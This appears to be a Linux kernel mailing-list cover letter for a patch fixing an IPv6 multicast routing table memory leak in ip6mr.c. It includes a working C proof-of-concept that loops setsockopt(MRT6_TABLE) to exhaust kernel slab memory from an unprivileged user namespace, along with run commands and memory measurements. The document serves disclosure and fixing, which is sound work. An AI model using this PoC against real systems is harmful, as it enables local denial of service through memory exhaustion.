Received: from mail-pj1-f45.google.com (mail-pj1-f45.google.com [209.85.216.45])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E75994B66E7
	for <netdev@vger.kernel.org>; Sat,  5 Sep 2026 16:30:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.45
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788625828; cv=none; b=UgUzELlbMI7FwVEsCh3hF6L6UIzhG2X4Gu4XsVWvnssC3m+lYD6FQV2+4cyvktfLKoY1LSPRjut0SOoQ/XAhIJvpwSCWkt1w8yjRzcvBWgJBQx4ZJE80RTtEXwm6pUUQcpBCBiXrPpd1NtmhEBsAQ+jOzEBH4nKN1aaaanH5h9M=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788625828; c=relaxed/simple;
	bh=ric0/zWkzrO3svULLEk/2yV/K+Q6D+VNusGzZOgIsMg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=R0w/Lr185vAxAAE7yMhOWrlC3rf9avxmNRhdUFbl69AwRDF3v8CSj1BpbRXRIYCoVTsCp7O8RGUerd1iGkRF4FjHpLwFBqUJXzAnDBJTqkSlasnIvfeqR/y2B1haWBmrPQYE603/aeBpTi9e5sFTB3gTdPspiEaOLBaj/EPuA4s=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=AHU/mjG8; arc=none smtp.client-ip=209.85.216.45
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="AHU/mjG8"
Received: by mail-pj1-f45.google.com with SMTP id 98e67ed59e1d1-395cf2535acso2350627a91.1
        for <netdev@vger.kernel.org>; Sat, 05 Sep 2026 09:30:19 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788625818; x=1789230618; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=h/GIMi5fLyst4zRX0mI/Nrfa6FXRMLslJCoJ0m7XXMM=;
        b=AHU/mjG8KNV46mzxWUShBNpHfxFuB9NF0lXOmOwro4EzgJ8pUa+DMfdYEJST+cAKHr
         YGfn6XKVWhkb96kVwpDNZdoHIg8Mh4MbwJJMC+lmNZ7i5a9TaZWuFeGLQXFWNUvZ0o+g
         EJdKsYiTFToVNJWo7lZw5jko5eQvoPRve2IzXn+/EBmp8VILeZbKDYfWIosZ/+2z0NyQ
         foKpZBd65LoiFrLFl5Y04vcQLaPhg4vW4xQTpBYLW2UX4pzW/fGE2HWZ4yfIKZK97sR3
         LkjbKEDHRpBVY8cR3kxYqY/B8PykpqFYqx7KjT+XKvOjXEJcKgg8Vyx/2UalLWFpoGiy
         bg5Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788625818; x=1789230618;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=h/GIMi5fLyst4zRX0mI/Nrfa6FXRMLslJCoJ0m7XXMM=;
        b=OZC2QjkqKkTK53RYuveridRByxJl0A6QHb3o1Fsxz8E82VPDluQr3eIBZmG7HFbMRr
         jEH7UuHsNQvSEftCfcKJ8drYlBUFbLE7ydYEFVEh4LSiR3X9mnVIzgu8t/b5+mT+LnP3
         zpw32F4Rk/7oCGUoLRKAB9Ds575+gTxiOkPUbRqEo3HywNs0N35oGveNed7VOODOxBA1
         IlAXUqszIaIZuiqOL6u9QRrnNFDZmRWWtyzZjS5UwUiKymuzvaRDFAe4Z3z3COOdmh2I
         M+TJw0Vmnr6eTpwbA4sh/w4a5nV0mgv5XRps8ExR/AT0i07cOthJyAPJfc2oox7Sxe5n
         BQ9g==
X-Gm-Message-State: AFuF++loLCqZcVoyRMQuU03BfBJ9m/yf0ZeHi8S8TOi8aOebWbYe/0Ll
	cElKGA99MKKXvkVo+3+c5TyUd5g771V/qbDoyUj/QVpkMQCCbA5djoB87KXlxwD07Jgl/YGqGkN
	UsSespA==
X-Gm-Gg: AYBFou3OpbEziqqfouB26avDlFMzcyhaV0dzGcwxR09h+13NMDkQOGZ4+vSu9CY8P7D
	pTH/PeAfidxJazOh5E4BZ0pf0Y8lD69XOlYR6e+TR8X0MKokNJ9lSDIkHneN8HvD3UAEa4irH9i
	NmL/vjMhMXf5c7vLpg7OtAHU/fOyJQvoIlqycS+fAYdU+RCM+uvIRK1gvpZIIaLxMEFxPYCIR6X
	2EuECxg7K9tXcj3paes64XI1fHhDuQ4kZFNhFagkigx6dzSHe8/mXi89lkagG4dVHmpuV20/Rug
	v9kf6CYev27YyHLoaax2362/JCPExZgAxKsInFsZcAZyt+521M6XR/muzbScURlg/KqzgopcuLf
	hr1Bqf7qb64mqY9Eta+nib7ee38Y8gtZnaxts15Iq+LjgJ6F1PHF1x29L1FryI/0TjQfZvXLx9L
	LPTbUb3feDtmWsRo99pvqziaJtrBvF8+Ndvi4xujVGG+oNfBapT5zij1O9d+5x8J+8DkoVSkw80
	+E9/Ph5yOWZaY10fLs=
X-Received: by 2002:a17:90b:3fc7:b0:38f:de94:bf34 with SMTP id 98e67ed59e1d1-39b27d7751bmr10168194a91.10.1788625817774;
        Sat, 05 Sep 2026 09:30:17 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b08c397b1sm16781207a91.8.2026.09.05.09.30.12
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 05 Sep 2026 09:30:17 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Patrick McHardy <kaber@trash.net>,
	linux-kernel@vger.kernel.org
Subject: [PATCH net v2 0/1] ipv6: ip6mr: fix mr_table leak from MRT6_TABLE
Date: Sat,  5 Sep 2026 16:30:06 +0000
Message-ID: <cover.1788622674.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a mr_table leak in net/ipv6/ip6mr.c. The bug is
reachable by a process with CAP_NET_ADMIN and CAP_NET_RAW in the target
user and net namespace, including via unshare -Urn.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

MRT6_TABLE is supposed to select an IPv6 multicast routing table id.
ip6_mroute_setsockopt() currently calls ip6mr_new_table() for every
unseen id and links the new mr_table into mr6_tables. ip6mr_sk_done()
only clears mroute_sk and flushes MIF/MFC state, so the table stays
published until the net namespace is torn down.

A raw ICMPv6 socket can therefore loop MRT6_TABLE(fresh id) without
MRT6_INIT, close the socket, and still leave the allocations behind.
The same hole exists after MRT6_TABLE plus a successful MRT6_INIT,
MRT6_ADD_MIF or MRT6_ADD_MFC: DONE or close still leaves an empty
non-default table in mr6_tables.

On an unfixed 7.3.0-rc1 kernel in a 2 vCPU, 2 GB QEMU VM, 30000 ids
grew Slab from 25696 kB to 148400 kB (+122704 kB) and SUnreclaim from
18108 kB to 140812 kB. setsockopt() still returned 0; that run did not
panic. The log below is from that kernel. There is no stack trace to
decode.

This behavior was introduced with multiple-table support. Later
changes only made the path easier to hit, so Fixes: still points at
commit d1db275dd3f6 ("ipv6: ip6mr: support multiple tables").

The patch keeps MRT6_TABLE as a selector: it only stores the chosen
id on the socket. The table is created later, under RTNL, when a
command actually needs it (MRT6_INIT, MRT6_ADD_MIF, MRT6_ADD_MFC, or
MRT6_ADD_MFC_PROXY). That matches existing users such as the ipmr
selftest, which issues MRT6_TABLE and then ADD_MIF without INIT.

The new table is published before INIT/ADD so a VIF or MFC notifier
cannot fire against a tb_id that dump cannot see yet. If that command
fails, the still-empty table is unlinked and freed in the same
syscall. After DONE, close, DEL_MIF, DEL_MFC, FLUSH or device
unregister, an empty non-default table is dropped from mr6_tables.
The device notifier only reclaims when this unregister actually
removed a VIF, so a nested pimreg unregister cannot destroy the table
twice. If DEL_MIF leaves unresolved MFC entries, the expire timer
later queues that reclaim onto RTNL. The default table is left in
place.

The leak is a setsockopt lifetime bug, not a packet-sequence bug, so
the reproducer is a raw ICMPv6 socket program rather than
packetdrill.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

setsockopt() still returns 0 after the fix, so compare Slab and
SUnreclaim in /proc/meminfo before and after. Take those numbers in a
persistent net namespace. unshare -Urn ./poc is enough to prove
reachability, but it destroys the namespace on exit, so the parent
/proc/meminfo cannot show the leftover tables.

The meminfo numbers below were taken with:

    ./poc 30000 1

On the unfixed 7.3.0-rc1 kernel the loop grows unreclaimable slab; on
the fixed kernel it does not.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute6.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [count] [start_table]\n"
		"  count: number of new MRT6 table ids to allocate (default: 200000)\n"
		"  start_table: first table id to use (default: 1)\n",
		prog);
	exit(1);
}

int main(int argc, char **argv)
{
	unsigned int count = 200000;
	unsigned int start = 1;
	unsigned int i;
	int fd;

	if (argc > 3)
		usage(argv[0]);
	if (argc >= 2)
		count = strtoul(argv[1], NULL, 0);
	if (argc == 3)
		start = strtoul(argv[2], NULL, 0);

	if (count == 0 || start == 0 || start >= 100000000U)
		usage(argv[0]);

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
	if (fd < 0)
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");

	for (i = 0; i < count; i++) {
		u_int32_t table = start + i;

		if (table >= 100000000U) {
			fprintf(stderr, "stopped before invalid table id %u\n", table);
			break;
		}

		if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table,
			       sizeof(table)) < 0) {
			fprintf(stderr,
				"setsockopt(MRT6_TABLE, %u) failed after %u allocations: %s\n",
				table, i, strerror(errno));
			close(fd);
			return 2;
		}

		if ((i % 10000) == 0) {
			struct rusage ru;

			if (!getrusage(RUSAGE_SELF, &ru))
				fprintf(stderr,
					"allocated=%u current_table=%u maxrss_kb=%ld\n",
					i + 1, table, ru.ru_maxrss);
			else
				fprintf(stderr, "allocated=%u current_table=%u\n",
					i + 1, table);
		}
	}

		fprintf(stderr,
			"done: allocated %u tables on one socket without MRT6_INIT; closing socket now\n",
			i);
	close(fd);
	sleep(2);
	fprintf(stderr, "socket closed; tables persist until netns teardown\n");
	return 0;
}
------END poc.c--------

----BEGIN crash log----
Linux syzkaller 7.3.0-rc1-00240-g641d03105cc0 #2 SMP PREEMPT_DYNAMIC Sat Sep  5 21:32:21 CST 2026 x86_64 GNU/Linux

./poc 30000 1

allocated=1 current_table=1 maxrss_kb=1188
allocated=10001 current_table=10001 maxrss_kb=1188
allocated=20001 current_table=20001 maxrss_kb=1188
done: allocated 30000 tables on one socket without MRT6_INIT; closing socket now
socket closed; tables persist until netns teardown
RET:0

before:
MemAvailable:    1907696 kB
Slab:              25696 kB
SUnreclaim:        18108 kB

after:
MemAvailable:    1810360 kB
Slab:             148400 kB
SUnreclaim:       140812 kB
-----END crash log-----

Best regards,
Zihan Xi


Zihan Xi (1):
  ipv6: ip6mr: fix mr_table leak from MRT6_TABLE

 net/ipv6/ip6mr.c | 327 ++++++++++++++++++++++++++++++++++++++++-------
 1 file changed, 280 insertions(+), 47 deletions(-)


base-commit: 641d03105cc0d2437e32fdeec164f91a4ccef6c4
-- 
2.43.0

